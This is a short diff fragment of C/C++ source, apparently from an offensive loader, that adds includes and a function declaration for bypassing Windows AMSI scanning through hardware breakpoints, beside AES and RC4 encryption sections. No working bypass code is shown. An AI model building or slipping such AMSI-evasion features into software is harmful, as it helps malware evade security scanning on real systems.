@@ -9,6 +9,12 @@
 #include "Config.hpp"
 #include "aes.h"
 
+#ifdef BYPASS_AMSI
+#include "HardwareBreakPoints.h"
+#include "Structs.h"
+VOID AmsiScanBufDetour(PCONTEXT pThreadCtx);
+#endif // !BYPASS_AMSI
+
 #ifdef RC4
 typedef struct
 {
